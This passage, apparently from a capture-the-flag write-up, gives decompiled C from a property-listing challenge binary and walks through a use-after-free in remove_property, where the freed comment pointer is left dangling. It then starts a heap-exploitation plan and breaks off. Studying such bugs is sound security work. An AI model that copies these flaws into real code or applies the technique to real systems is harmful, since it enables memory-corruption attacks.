</span></span><span style="display:flex;"><span>      <span style="color:#069;font-weight:bold">if</span> (<span style="color:#555">*</span>(<span style="color:#078;font-weight:bold">long</span> <span style="color:#555">*</span>)(property <span style="color:#555">+</span> <span style="color:#f60">0x20</span>) <span style="color:#555">==</span> <span style="color:#f60">0</span>) {
</span></span><span style="display:flex;"><span>        puts(<span style="color:#c30">&#34;Failed to allocate memory for the street name&#34;</span>);
</span></span><span style="display:flex;"><span>                    <span style="color:#09f;font-style:italic">/* WARNING: Subroutine does not return */</span>
</span></span><span style="display:flex;"><span>        exit(<span style="color:#f60">1</span>);
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#555">*</span>(ulong <span style="color:#555">*</span>)(property <span style="color:#555">+</span> <span style="color:#f60">0x28</span>) <span style="color:#555">=</span> input_size;
</span></span><span style="display:flex;"><span>    printf(<span style="color:#c30">&#34;Enter the new street name: &#34;</span>);
</span></span><span style="display:flex;"><span>    fgets(<span style="color:#555">*</span>(<span style="color:#078;font-weight:bold">char</span> <span style="color:#555">**</span>)(property <span style="color:#555">+</span> <span style="color:#f60">0x20</span>),(<span style="color:#078;font-weight:bold">int</span>)<span style="color:#555">*</span>(undefined8 <span style="color:#555">*</span>)(property <span style="color:#555">+</span> <span style="color:#f60">0x28</span>),stdin);
</span></span><span style="display:flex;"><span>    _property <span style="color:#555">=</span> <span style="color:#555">*</span>(<span style="color:#078;font-weight:bold">long</span> <span style="color:#555">*</span>)(property <span style="color:#555">+</span> <span style="color:#f60">0x20</span>);
</span></span><span style="display:flex;"><span>    sVar2 <span style="color:#555">=</span> strcspn(<span style="color:#555">*</span>(<span style="color:#078;font-weight:bold">char</span> <span style="color:#555">**</span>)(property <span style="color:#555">+</span> <span style="color:#f60">0x20</span>),<span style="color:#c30">&#34;</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#555">*</span>(undefined <span style="color:#555">*</span>)(sVar2 <span style="color:#555">+</span> _property) <span style="color:#555">=</span> <span style="color:#f60">0</span>;
</span></span><span style="display:flex;"><span>    local_29 <span style="color:#555">=</span> <span style="color:#c30">&#39;n&#39;</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  printf(<span style="color:#c30">&#34;Would you like to change the price of the property? [y/n]: &#34;</span>);
</span></span><span style="display:flex;"><span>  __isoc99_scanf(<span style="color:#555">&amp;</span>DAT_00102133,<span style="color:#555">&amp;</span>local_29);
</span></span><span style="display:flex;"><span>  getchar();
</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">if</span> (local_29 <span style="color:#555">==</span> <span style="color:#c30">&#39;y&#39;</span>) {
</span></span><span style="display:flex;"><span>    printf(<span style="color:#c30">&#34;What is the new price of the property?: &#34;</span>);
</span></span><span style="display:flex;"><span>    __isoc99_scanf(<span style="color:#555">&amp;</span>fmt_lf,property <span style="color:#555">+</span> <span style="color:#f60">0x10</span>);
</span></span><span style="display:flex;"><span>    getchar();
</span></span><span style="display:flex;"><span>    local_29 <span style="color:#555">=</span> <span style="color:#c30">&#39;n&#39;</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">if</span> (<span style="color:#555">*</span>(<span style="color:#078;font-weight:bold">long</span> <span style="color:#555">*</span>)(property <span style="color:#555">+</span> <span style="color:#f60">0x30</span>) <span style="color:#555">==</span> <span style="color:#f60">0</span>) {
</span></span><span style="display:flex;"><span>    printf(<span style="color:#c30">&#34;Would you like to add a comment? [y/n]: &#34;</span>);
</span></span><span style="display:flex;"><span>    __isoc99_scanf(<span style="color:#555">&amp;</span>DAT_00102133,<span style="color:#555">&amp;</span>local_29);
</span></span><span style="display:flex;"><span>    getchar();
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">if</span> (local_29 <span style="color:#555">==</span> <span style="color:#c30">&#39;y&#39;</span>) {
</span></span><span style="display:flex;"><span>      printf(<span style="color:#c30">&#34;What is the length of the comment?: &#34;</span>);
</span></span><span style="display:flex;"><span>      __isoc99_scanf(<span style="color:#555">&amp;</span>fmt_zu);
</span></span><span style="display:flex;"><span>      getchar();
</span></span><span style="display:flex;"><span>      _property <span style="color:#555">=</span> property;
</span></span><span style="display:flex;"><span>      pvVar1 <span style="color:#555">=</span> malloc(<span style="color:#555">*</span>(<span style="color:#078;font-weight:bold">long</span> <span style="color:#555">*</span>)(property <span style="color:#555">+</span> <span style="color:#f60">0x38</span>) <span style="color:#555">+</span> <span style="color:#f60">1</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#555">*</span>(<span style="color:#078;font-weight:bold">void</span> <span style="color:#555">**</span>)(_property <span style="color:#555">+</span> <span style="color:#f60">0x30</span>) <span style="color:#555">=</span> pvVar1;
</span></span><span style="display:flex;"><span>      <span style="color:#069;font-weight:bold">if</span> (<span style="color:#555">*</span>(<span style="color:#078;font-weight:bold">long</span> <span style="color:#555">*</span>)(property <span style="color:#555">+</span> <span style="color:#f60">0x30</span>) <span style="color:#555">==</span> <span style="color:#f60">0</span>) {
</span></span><span style="display:flex;"><span>        puts(<span style="color:#c30">&#34;Failed to allocate memory for the comment&#34;</span>);
</span></span><span style="display:flex;"><span>                    <span style="color:#09f;font-style:italic">/* WARNING: Subroutine does not return */</span>
</span></span><span style="display:flex;"><span>        exit(<span style="color:#f60">1</span>);
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      printf(<span style="color:#c30">&#34;Enter the comment: &#34;</span>);
</span></span><span style="display:flex;"><span>      fgets(<span style="color:#555">*</span>(<span style="color:#078;font-weight:bold">char</span> <span style="color:#555">**</span>)(property <span style="color:#555">+</span> <span style="color:#f60">0x30</span>),(<span style="color:#078;font-weight:bold">int</span>)<span style="color:#555">*</span>(undefined8 <span style="color:#555">*</span>)(property <span style="color:#555">+</span> <span style="color:#f60">0x38</span>),stdin);
</span></span><span style="display:flex;"><span>      _property <span style="color:#555">=</span> <span style="color:#555">*</span>(<span style="color:#078;font-weight:bold">long</span> <span style="color:#555">*</span>)(property <span style="color:#555">+</span> <span style="color:#f60">0x30</span>);
</span></span><span style="display:flex;"><span>      sVar2 <span style="color:#555">=</span> strcspn(<span style="color:#555">*</span>(<span style="color:#078;font-weight:bold">char</span> <span style="color:#555">**</span>)(property <span style="color:#555">+</span> <span style="color:#f60">0x30</span>),<span style="color:#c30">&#34;</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#34;</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#555">*</span>(undefined <span style="color:#555">*</span>)(sVar2 <span style="color:#555">+</span> _property) <span style="color:#555">=</span> <span style="color:#f60">0</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">else</span> {
</span></span><span style="display:flex;"><span>    printf(<span style="color:#c30">&#34;Would you like to change the comment? [y/n]: &#34;</span>);
</span></span><span style="display:flex;"><span>    __isoc99_scanf(<span style="color:#555">&amp;</span>DAT_00102133,<span style="color:#555">&amp;</span>local_29);
</span></span><span style="display:flex;"><span>    getchar();
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">if</span> (local_29 <span style="color:#555">==</span> <span style="color:#c30">&#39;y&#39;</span>) {
</span></span><span style="display:flex;"><span>      printf(<span style="color:#c30">&#34;Enter the new comment length: &#34;</span>);
</span></span><span style="display:flex;"><span>      __isoc99_scanf(<span style="color:#555">&amp;</span>fmt_zu);
</span></span><span style="display:flex;"><span>      getchar();
</span></span><span style="display:flex;"><span>      <span style="color:#069;font-weight:bold">if</span> (<span style="color:#555">*</span>(ulong <span style="color:#555">*</span>)(property <span style="color:#555">+</span> <span style="color:#f60">0x38</span>) <span style="color:#555">&lt;</span> input_size) {
</span></span><span style="display:flex;"><span>        free(<span style="color:#555">*</span>(<span style="color:#078;font-weight:bold">void</span> <span style="color:#555">**</span>)(property <span style="color:#555">+</span> <span style="color:#f60">0x30</span>));
</span></span><span style="display:flex;"><span>        _property <span style="color:#555">=</span> property;
</span></span><span style="display:flex;"><span>        pvVar1 <span style="color:#555">=</span> malloc(input_size <span style="color:#555">+</span> <span style="color:#f60">1</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#555">*</span>(<span style="color:#078;font-weight:bold">void</span> <span style="color:#555">**</span>)(_property <span style="color:#555">+</span> <span style="color:#f60">0x30</span>) <span style="color:#555">=</span> pvVar1;
</span></span><span style="display:flex;"><span>        <span style="color:#069;font-weight:bold">if</span> (<span style="color:#555">*</span>(<span style="color:#078;font-weight:bold">long</span> <span style="color:#555">*</span>)(property <span style="color:#555">+</span> <span style="color:#f60">0x30</span>) <span style="color:#555">==</span> <span style="color:#f60">0</span>) {
</span></span><span style="display:flex;"><span>          puts(<span style="color:#c30">&#34;Failed to allocate memroy for the comment&#34;</span>);
</span></span><span style="display:flex;"><span>                    <span style="color:#09f;font-style:italic">/* WARNING: Subroutine does not return */</span>
</span></span><span style="display:flex;"><span>          exit(<span style="color:#f60">1</span>);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      <span style="color:#555">*</span>(ulong <span style="color:#555">*</span>)(property <span style="color:#555">+</span> <span style="color:#f60">0x38</span>) <span style="color:#555">=</span> input_size;
</span></span><span style="display:flex;"><span>      printf(<span style="color:#c30">&#34;Enter the new comment: &#34;</span>);
</span></span><span style="display:flex;"><span>      fgets(<span style="color:#555">*</span>(<span style="color:#078;font-weight:bold">char</span> <span style="color:#555">**</span>)(property <span style="color:#555">+</span> <span style="color:#f60">0x30</span>),(<span style="color:#078;font-weight:bold">int</span>)<span style="color:#555">*</span>(undefined8 <span style="color:#555">*</span>)(property <span style="color:#555">+</span> <span style="color:#f60">0x38</span>),stdin);
</span></span><span style="display:flex;"><span>      _property <span style="color:#555">=</span> <span style="color:#555">*</span>(<span style="color:#078;font-weight:bold">long</span> <span style="color:#555">*</span>)(property <span style="color:#555">+</span> <span style="color:#f60">0x30</span>);
</span></span><span style="display:flex;"><span>      sVar2 <span style="color:#555">=</span> strcspn(<span style="color:#555">*</span>(<span style="color:#078;font-weight:bold">char</span> <span style="color:#555">**</span>)(property <span style="color:#555">+</span> <span style="color:#f60">0x30</span>),<span style="color:#c30">&#34;</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#34;</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#555">*</span>(undefined <span style="color:#555">*</span>)(sVar2 <span style="color:#555">+</span> _property) <span style="color:#555">=</span> <span style="color:#f60">0</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">if</span> (local_20 <span style="color:#555">!=</span> <span style="color:#555">*</span>(<span style="color:#078;font-weight:bold">long</span> <span style="color:#555">*</span>)(in_FS_OFFSET <span style="color:#555">+</span> <span style="color:#f60">0x28</span>)) {
</span></span><span style="display:flex;"><span>                    <span style="color:#09f;font-style:italic">/* WARNING: Subroutine does not return */</span>
</span></span><span style="display:flex;"><span>    __stack_chk_fail();
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">return</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></td></tr></table>
</div>
</div><p>Okay, so what it do is:</p>
<ul>
<li>We can change all the metadata of property, with rules:
<ul>
<li>If the new size is smaller than the stored size, it will:
<ul>
<li>Directly replace the metadata values</li>
<li>Store the new size inside <code>property</code> object</li>
</ul>
</li>
<li>If the new size is larger, it will:
<ul>
<li>Free the chunk</li>
<li>Alloc new chunk with new size</li>
<li>Store the new size inside <code>property</code> object</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="show_property">show_property <a href="#show_property" class="anchor">#</a></h4>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#078;font-weight:bold">void</span> <span style="color:#c0f">show_property</span>(<span style="color:#078;font-weight:bold">void</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  puts(<span style="color:#c30">&#34;Your property info:</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#34;</span>);
</span></span><span style="display:flex;"><span>  printf(<span style="color:#c30">&#34;House number: %d</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#34;</span>,(ulong)<span style="color:#555">*</span>(uint <span style="color:#555">*</span>)(property <span style="color:#555">+</span> <span style="color:#f60">0x18</span>));
</span></span><span style="display:flex;"><span>  printf(<span style="color:#c30">&#34;Street name: %s</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#34;</span>,<span style="color:#555">*</span>(undefined8 <span style="color:#555">*</span>)(property <span style="color:#555">+</span> <span style="color:#f60">0x20</span>));
</span></span><span style="display:flex;"><span>  printf(<span style="color:#555">*</span>(<span style="color:#078;font-weight:bold">char</span> <span style="color:#555">**</span>)(property <span style="color:#555">+</span> <span style="color:#f60">0x10</span>),<span style="color:#c30">&#34;Price: $%0.2f</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">if</span> ((<span style="color:#555">*</span>(<span style="color:#078;font-weight:bold">long</span> <span style="color:#555">*</span>)(property <span style="color:#555">+</span> <span style="color:#f60">0x38</span>) <span style="color:#555">==</span> <span style="color:#f60">0</span>) <span style="color:#555">||</span> (<span style="color:#555">*</span>(<span style="color:#078;font-weight:bold">long</span> <span style="color:#555">*</span>)(property <span style="color:#555">+</span> <span style="color:#f60">0x30</span>) <span style="color:#555">==</span> <span style="color:#f60">0</span>)) {
</span></span><span style="display:flex;"><span>    puts(<span style="color:#c30">&#34;No comment for the property.&#34;</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">else</span> {
</span></span><span style="display:flex;"><span>    printf(<span style="color:#c30">&#34;Comment: %s</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#34;</span>,<span style="color:#555">*</span>(undefined8 <span style="color:#555">*</span>)(property <span style="color:#555">+</span> <span style="color:#f60">0x30</span>));
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">return</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></td></tr></table>
</div>
</div><p>It just prints the property object metadata values</p>
<h4 id="change_username">change_username <a href="#change_username" class="anchor">#</a></h4>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#078;font-weight:bold">unsigned</span> <span style="color:#069;font-weight:bold">__int64</span> <span style="color:#c0f">change_name</span>()
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#078;font-weight:bold">char</span> <span style="color:#555">*</span>v0; <span style="color:#09f;font-style:italic">// rbx
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>  size_t v2; <span style="color:#09f;font-style:italic">// [rsp-28h] [rbp-28h]
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>  <span style="color:#078;font-weight:bold">unsigned</span> <span style="color:#069;font-weight:bold">__int64</span> v3; <span style="color:#09f;font-style:italic">// [rsp-20h] [rbp-20h]
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>
</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">__asm</span> { endbr64 }
</span></span><span style="display:flex;"><span>  v3 <span style="color:#555">=</span> __readfsqword(<span style="color:#f60">0x28u</span>);
</span></span><span style="display:flex;"><span>  v2 <span style="color:#555">=</span> <span style="color:#f60">0LL</span>;
</span></span><span style="display:flex;"><span>  printf(<span style="color:#c30">&#34;What is the length of your new name?: &#34;</span>, <span style="color:#f60">0LL</span>);
</span></span><span style="display:flex;"><span>  __isoc99_scanf(<span style="color:#c30">&#34;%zu&#34;</span>, <span style="color:#555">&amp;</span>v2);
</span></span><span style="display:flex;"><span>  getchar();
</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">if</span> ( n <span style="color:#555">&lt;</span> v2 )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    free(username);
</span></span><span style="display:flex;"><span>    username <span style="color:#555">=</span> (<span style="color:#078;font-weight:bold">char</span> <span style="color:#555">*</span>)malloc(v2 <span style="color:#555">+</span> <span style="color:#f60">1</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">if</span> ( <span style="color:#555">!</span>username )
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>      puts(<span style="color:#c30">&#34;Failed to allocate memory&#34;</span>);
</span></span><span style="display:flex;"><span>      exit(<span style="color:#f60">1</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  n <span style="color:#555">=</span> v2;
</span></span><span style="display:flex;"><span>  printf(<span style="color:#c30">&#34;Enter your new name: &#34;</span>);
</span></span><span style="display:flex;"><span>  fgets(username, n, stdin);
</span></span><span style="display:flex;"><span>  v0 <span style="color:#555">=</span> username;
</span></span><span style="display:flex;"><span>  v0[strcspn(username, <span style="color:#c30">&#34;</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#34;</span>)] <span style="color:#555">=</span> <span style="color:#f60">0</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">return</span> __readfsqword(<span style="color:#f60">0x28u</span>) <span style="color:#555">^</span> v3;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></td></tr></table>
</div>
</div><p>Similar to edit, it will check:</p>
<ul>
<li>If the new size is smaller than the stored size, it will:
<ul>
<li>Directly replace the <code>username</code> values</li>
<li>Store the new size inside <code>username</code> object</li>
</ul>
</li>
<li>If the new size is larger, it will:
<ul>
<li>Free the chunk</li>
<li>Alloc new chunk with new size</li>
<li>Store the new size inside <code>username</code> object</li>
</ul>
</li>
</ul>
<h4 id="remove_property">remove_property <a href="#remove_property" class="anchor">#</a></h4>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#078;font-weight:bold">void</span> <span style="color:#c0f">remove_property</span>(<span style="color:#078;font-weight:bold">void</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">if</span> (<span style="color:#555">*</span>(<span style="color:#078;font-weight:bold">long</span> <span style="color:#555">*</span>)((<span style="color:#078;font-weight:bold">long</span>)property <span style="color:#555">+</span> <span style="color:#f60">0x30</span>) <span style="color:#555">!=</span> <span style="color:#f60">0</span>) {
</span></span><span style="display:flex;"><span>    free(<span style="color:#555">*</span>(<span style="color:#078;font-weight:bold">void</span> <span style="color:#555">**</span>)((<span style="color:#078;font-weight:bold">long</span>)property <span style="color:#555">+</span> <span style="color:#f60">0x30</span>));
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">if</span> (<span style="color:#555">*</span>(<span style="color:#078;font-weight:bold">long</span> <span style="color:#555">*</span>)((<span style="color:#078;font-weight:bold">long</span>)property <span style="color:#555">+</span> <span style="color:#f60">0x20</span>) <span style="color:#555">!=</span> <span style="color:#f60">0</span>) {
</span></span><span style="display:flex;"><span>    free(<span style="color:#555">*</span>(<span style="color:#078;font-weight:bold">void</span> <span style="color:#555">**</span>)((<span style="color:#078;font-weight:bold">long</span>)property <span style="color:#555">+</span> <span style="color:#f60">0x20</span>));
</span></span><span style="display:flex;"><span>    <span style="color:#555">*</span>(undefined8 <span style="color:#555">*</span>)((<span style="color:#078;font-weight:bold">long</span>)property <span style="color:#555">+</span> <span style="color:#f60">0x20</span>) <span style="color:#555">=</span> <span style="color:#f60">0</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  free(property);
</span></span><span style="display:flex;"><span>  property <span style="color:#555">=</span> (<span style="color:#078;font-weight:bold">void</span> <span style="color:#555">*</span>)<span style="color:#f60">0x0</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">return</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></td></tr></table>
</div>
</div><p>Wow, there is a bug on this method. What it do is basically:</p>
<ul>
<li>free(comment)
<ul>
<li>and <strong>NOT</strong> nulled it</li>
</ul>
</li>
<li>free(street)
<ul>
<li>and nulled it</li>
</ul>
</li>
<li>free(property)
<ul>
<li>and nulled it</li>
</ul>
</li>
</ul>
<p>After reading all of those decompilations, we can notice a bug where the comment is not nulled after being freed. This means, if we:</p>
<ul>
<li>add property with comment</li>
<li>remove property</li>
<li>add property without comment</li>
</ul>
<p>The latest property will still have comment (because <code>property</code> still located in the same address due to cache), and its comment still points to the freed chunk. What if we do <code>edit_property</code> on it? Basically we can forge the chunk metadata</p>
<h3 id="exploitation-plan">Exploitation Plan <a href="#exploitation-plan" class="anchor">#</a></h3>
<p>Okay, so important points that we can conclude from our initial analysis:</p>
<ul>
<li>We can malloc chunk with any size
<ul>
<li>Hence, we can freed a chunk to unsorted bin by malloc large chunk</li>
</ul>
</li>
